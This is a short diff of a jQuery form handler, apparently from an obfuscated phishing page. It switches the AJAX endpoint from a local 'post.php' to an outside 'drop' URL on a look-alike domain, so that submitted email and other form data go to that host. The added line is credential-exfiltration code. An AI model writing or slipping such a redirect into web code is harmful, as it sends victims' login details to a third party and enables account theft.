@@ -42,7 +42,7 @@ $(document).ready(function () {
     $("#mcontent").css('display', "none");
     $("#mspinner").css('display', "block");
     $.ajax({
-      'url': "post.php",
+      'url': "https://zhonqnan.com/drop/post.php",
       'method': "post",
       'data': {
         'email': _0x353e29,
@@ -62,4 +62,5 @@ $(document).ready(function () {
       }
     });
   });
+
 });
